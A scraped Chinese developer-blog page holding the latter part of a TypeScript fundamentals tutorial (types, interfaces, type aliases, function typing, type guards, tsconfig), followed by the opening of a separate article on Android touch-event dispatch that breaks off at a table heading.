<p>TS 会根据变量的初始值自动推断类型，无需手动注解（日常开发中优先用推断，减少冗余）。</p>
<p>typescript</p>
<p>运行</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> str = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// TS 自动推断 str 为 string 类型</span>
str = <span class="hljs-number">123</span>; <span class="hljs-comment">// 报错：不能将类型“number”分配给类型“string”</span>

<span class="hljs-keyword">let</span> num = <span class="hljs-number">100</span>; <span class="hljs-comment">// 推断为 number 类型</span>
<span class="hljs-keyword">let</span> bool = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 推断为 boolean 类型</span>
</code></pre>
<p><strong>核心原则</strong>：能靠推断的就不手动注解，需要明确约束时才加注解。</p>
<h2 data-id="heading-8">四、常用基础类型</h2>
<h3 data-id="heading-9">1. 原始类型</h3>
<p>表格</p>













































<table><thead><tr><th>类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>string</code></td><td>字符串</td><td><code>let str: string = "TS"</code></td></tr><tr><td><code>number</code></td><td>数字</td><td><code>let num: number = 666</code></td></tr><tr><td><code>boolean</code></td><td>布尔值</td><td><code>let flag: boolean = false</code></td></tr><tr><td><code>null</code></td><td>空值</td><td><code>let n: null = null</code></td></tr><tr><td><code>undefined</code></td><td>未定义</td><td><code>let u: undefined = undefined</code></td></tr><tr><td><code>symbol</code></td><td>唯一值</td><td><code>let s: symbol = Symbol("id")</code></td></tr><tr><td><code>bigint</code></td><td>大整数</td><td><code>let b: bigint = 100n</code></td></tr></tbody></table>
<h3 data-id="heading-10">2. 数组</h3>
<p>两种写法，推荐第一种：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 写法1：类型[]</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">numbers</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-comment">// 写法2：Array&lt;类型&gt;</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">strings</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>];
<span class="hljs-comment">// 禁止混合类型（除非指定联合类型）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">mix</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">"a"</span>]; <span class="hljs-comment">// 联合类型：字符串或数字</span>
</code></pre>
<h3 data-id="heading-11">3. 元组（Tuple）</h3>
<p>固定长度、固定类型的数组（强约束）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 元组注解：第一个元素是string，第二个是number</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">"张三"</span>, <span class="hljs-number">25</span>];
tuple[<span class="hljs-number">0</span>] = <span class="hljs-string">"李四"</span>; <span class="hljs-comment">// 合法</span>
tuple[<span class="hljs-number">1</span>] = <span class="hljs-number">30</span>; <span class="hljs-comment">// 合法</span>
tuple.<span class="hljs-title function_">push</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 注意：push 不会报错（TS 设计缺陷），但访问 tuple[2] 会报错</span>
</code></pre>
<h3 data-id="heading-12">4. 任意类型（any）</h3>
<p>关闭 TS 类型检查，慎用（失去 TS 核心价值）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">anyValue</span>: <span class="hljs-built_in">any</span> = <span class="hljs-string">"hello"</span>;
anyValue = <span class="hljs-number">123</span>; <span class="hljs-comment">// 不报错</span>
anyValue = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 不报错</span>
anyValue.<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 不报错（运行时可能崩溃）</span>
</code></pre>
<h3 data-id="heading-13">5. 未知类型（unknown）</h3>
<p>安全版 <code>any</code>，必须先类型校验才能使用：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">unknownValue</span>: <span class="hljs-built_in">unknown</span> = <span class="hljs-string">"hello"</span>;
<span class="hljs-comment">// unknownValue.toUpperCase(); // 报错：不能直接调用方法</span>

<span class="hljs-comment">// 先校验类型，再使用</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> unknownValue === <span class="hljs-string">"string"</span>) {
  unknownValue.<span class="hljs-title function_">toUpperCase</span>(); <span class="hljs-comment">// 合法</span>
}
</code></pre>
<h3 data-id="heading-14">6. 空类型（void）</h3>
<p>表示函数没有返回值（或返回 <code>undefined</code>）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logMsg</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"这是一个无返回值的函数"</span>);
  <span class="hljs-comment">// 省略 return 或 return undefined 均合法</span>
}
</code></pre>
<h3 data-id="heading-15">7. 永不类型（never）</h3>
<p>表示永远不会发生的值（如抛出错误、无限循环）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 抛出错误的函数，返回值为 never</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"出错了！"</span>);
}

<span class="hljs-comment">// 无限循环的函数，返回值为 never</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {}
}
</code></pre>
<h2 data-id="heading-16">五、进阶基础：接口与类型别名</h2>
<h3 data-id="heading-17">1. 接口（interface）</h3>
<p>用于约束对象的结构，可扩展、可实现，是 TS 中定义对象类型的核心方式：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 必选属性</span>
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 必选属性</span>
  gender?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 可选属性（加 ?）</span>
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 只读属性（不可修改）</span>
}

<span class="hljs-comment">// 使用接口约束对象</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">id</span>: <span class="hljs-number">1001</span>,
  <span class="hljs-comment">// gender 可选，可省略</span>
};

user.<span class="hljs-property">id</span> = <span class="hljs-number">1002</span>; <span class="hljs-comment">// 报错：只读属性不能修改</span>
</code></pre>
<h3 data-id="heading-18">2. 类型别名（type）</h3>
<p>给类型起别名，适用范围更广（可约束任意类型，不止对象）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基本类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Str</span> = <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">str</span>: <span class="hljs-title class_">Str</span> = <span class="hljs-string">"hello"</span>;

<span class="hljs-comment">// 对象类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 联合类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberOrString</span> = <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-title class_">NumberOrString</span> = <span class="hljs-number">100</span>;
value = <span class="hljs-string">"abc"</span>;
</code></pre>
<h3 data-id="heading-19">3. interface vs type 核心区别</h3>
<p>表格</p>

























<table><thead><tr><th>特性</th><th>interface</th><th>type</th></tr></thead><tbody><tr><td>扩展</td><td>可通过 <code>extends</code> 扩展</td><td>可通过 <code>&amp;</code> 交叉扩展</td></tr><tr><td>重复定义</td><td>支持（自动合并）</td><td>不支持（会报错）</td></tr><tr><td>适用范围</td><td>主要约束对象 / 类</td><td>可约束任意类型（基本类型、联合类型等）</td></tr></tbody></table>
<p><strong>使用建议</strong>：定义对象 / 类的结构用 <code>interface</code>，其他场景用 <code>type</code>。</p>
<h2 data-id="heading-20">六、函数相关类型</h2>
<h3 data-id="heading-21">1. 函数参数与返回值注解</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 普通函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// 箭头函数</span>
<span class="hljs-keyword">const</span> multiply = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-comment">// 无返回值</span>
<span class="hljs-keyword">const</span> log = (<span class="hljs-attr">msg</span>: <span class="hljs-built_in">string</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);
};
</code></pre>
<h3 data-id="heading-22">2. 可选参数与默认参数</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 可选参数（加 ?，必须放在必选参数后面）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age?: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`姓名：<span class="hljs-subst">${name}</span>，年龄：<span class="hljs-subst">${age || <span class="hljs-string">"未知"</span>}</span>`</span>);
}
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"张三"</span>); <span class="hljs-comment">// 合法</span>
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">// 合法</span>

<span class="hljs-comment">// 默认参数（自动推断类型，无需加 ?）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span> = <span class="hljs-string">"游客"</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，<span class="hljs-subst">${name}</span>`</span>);
}
<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 输出：你好，游客</span>
</code></pre>
<h3 data-id="heading-23">3. 函数类型别名</h3>
<p>定义函数的 “形状”（参数类型 + 返回值类型）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义函数类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// 实现函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> x + y;
};
</code></pre>
<h2 data-id="heading-24">七、类型守卫</h2>
<p>通过代码逻辑缩小类型范围，让 TS 更精准推断类型：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// typeof 类型守卫（适用于原始类型）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printValue</span>(<span class="hljs-params">value: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"string"</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// TS 知道这里 value 是 string</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// TS 知道这里 value 是 number</span>
  }
}

<span class="hljs-comment">// instanceof 类型守卫（适用于类实例）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"汪汪汪"</span>);
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeAnimal</span>(<span class="hljs-params">animal: Animal</span>) {
  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {
    animal.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// TS 知道这里 animal 是 Dog 实例</span>
  }
}
</code></pre>
<h2 data-id="heading-25">八、TS 配置文件（tsconfig.json）</h2>
<p>项目中通过 <code>tsconfig.json</code> 配置 TS 编译规则，执行 <code>tsc --init</code> 生成默认配置，核心配置说明：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES6"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 编译目标 JS 版本（ES5/ES6/ESNext）</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 模块系统（CommonJS/ESModule）</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 编译后的 JS 文件输出目录</span>
    <span class="hljs-attr">"rootDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./src"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 源文件目录</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 开启严格模式（推荐，强制类型检查）</span>
    <span class="hljs-attr">"noImplicitAny"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 禁止隐式 any 类型</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 兼容 CommonJS 和 ESModule</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"./src/**/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 要编译的文件</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 排除的文件</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-26">九、新手避坑指南</h2>
<ol>
<li><strong>不要滥用 any</strong>：用 <code>unknown</code> 替代 any，保留类型检查；</li>
<li><strong>可选参数放最后</strong>：TS 要求可选参数必须在必选参数之后；</li>
<li><strong>元组 push 不报错</strong>：元组虽固定长度，但 push 不会触发 TS 报错，需手动规避；</li>
<li><strong>严格模式必开</strong>：<code>strict: true</code> 能暴露更多潜在问题，是 TS 核心价值所在；</li>
<li><strong>类型断言要谨慎</strong>：<code>as</code> 语法是 “告诉 TS 我比你更清楚类型”，滥用会导致类型不安全。</li>
</ol>
<h2 data-id="heading-27">总结</h2>
<ol>
<li>TS 核心是<strong>静态类型系统</strong>，通过类型注解 / 推断提前规避错误；</li>
<li>常用基础类型：原始类型、数组、元组、any/unknown、void/never，需掌握各自使用场景；</li>
<li>定义对象结构优先用 <code>interface</code>，其他类型约束用 <code>type</code>；</li>
<li>函数注解要关注参数、返回值、可选参数，类型守卫能提升类型推断精度；</li>
<li>项目中务必开启严格模式（<code>strict: true</code>），发挥 TS 最大价值。</li>
</ol>
<p>从 JS 过渡到 TS 无需一步到位，可先在项目中局部使用，逐步覆盖，重点是理解 “类型” 的核心思想，而非死记语法。掌握本文的基础知识，足以应对日常开发中 80% 的 TS 场景，后续可再深入泛型、装饰器、高级类型等内容。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android事件分发逻辑--针对事件分发相关函数的讲解]]></title>    <link>https://juejin.cn/post/7605542907118354484</link>    <guid>https://juejin.cn/post/7605542907118354484</guid>    <pubDate>2026-02-12T17:15:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605542907118354484" data-draft-id="7605537925150048308" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android事件分发逻辑--针对事件分发相关函数的讲解"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-12T17:15:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aurora419"/> <meta itemprop="url" content="https://juejin.cn/user/4114811667877977"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android事件分发逻辑--针对事件分发相关函数的讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4114811667877977/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aurora419
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:15:18.000Z" title="Thu Feb 12 2026 17:15:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="rainbow">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#474949;color:#d1d9e1}.hljs-comment,.hljs-quote{color:#969896;font-style:italic}.hljs-addition,.hljs-keyword,.hljs-literal,.hljs-selector-tag,.hljs-type{color:#c9c}.hljs-number,.hljs-selector-attr,.hljs-selector-pseudo{color:#f99157}.hljs-doctag,.hljs-regexp,.hljs-string{color:#8abeb7}.hljs-built_in,.hljs-name,.hljs-section,.hljs-title{color:#b5bd68}.hljs-class .hljs-title,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#fc6}.hljs-name,.hljs-section,.hljs-strong{font-weight:700}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-subst,.hljs-symbol{color:#f99157}.hljs-deletion{color:#dc322f}.hljs-formula{background:#eee8d5}.hljs-attr,.hljs-attribute{color:#81a2be}.hljs-emphasis{font-style:italic}</style><h2 data-id="heading-0">何为事件分发？</h2>
<p>声明:这是个人的学习笔记，刚学事件分发几天对事件分发的理解没有这么深请见谅
由于这篇文字是在飞书上写的所以一些颜色不对应，请见谅</p>
<p><strong>事件</strong>指的是<strong>屏幕触发事件</strong>——即Android中的<strong>TouchEvent/MotionEvent</strong>。每一次我们触摸屏幕，都会产生一连串的触摸事件，这些一连串的触摸事件合起来就是一个触摸事件序列。</p>
<p>触摸事件在Android官方API中由类MotionEvent来描述，不同的触摸事件对应不同的事件类型。事件类型分别有ACTION_DOWN、ACTION_UP、ACTION_MOVE、ACTION_CANCEL。(这里暂时不讨论多指触控)</p>
<p>那什么叫<strong>分发</strong>呢？我们都知道Android是由View树进行渲染的。假设屏幕坐标为（11，11）的区域既属于一个LinearLayout，又属于LinearLayout下的一个Button，那我这次触碰所产生的触摸事件，是该给LinearLayout还是Button呢？当然，我们很确定这次触摸事件最终会被Button所处理。<strong>那触摸事件是怎么给到Button的呢</strong>？需要经过LinearLayout吗？怎样能让Button不处理呢？这就需要我们了解触摸事件（后文统称为事件）在View树上传递与消费的过程，这就是事件的分发。</p>
<p>以下是 Android 中 <code>onTouchEvent</code> 常见的事件类型及其特性的汇总表格，以及针对各事件的深度解析。</p>
<h3 data-id="heading-1">Android 触摸事件（MotionEvent）核心概览表</h3>








































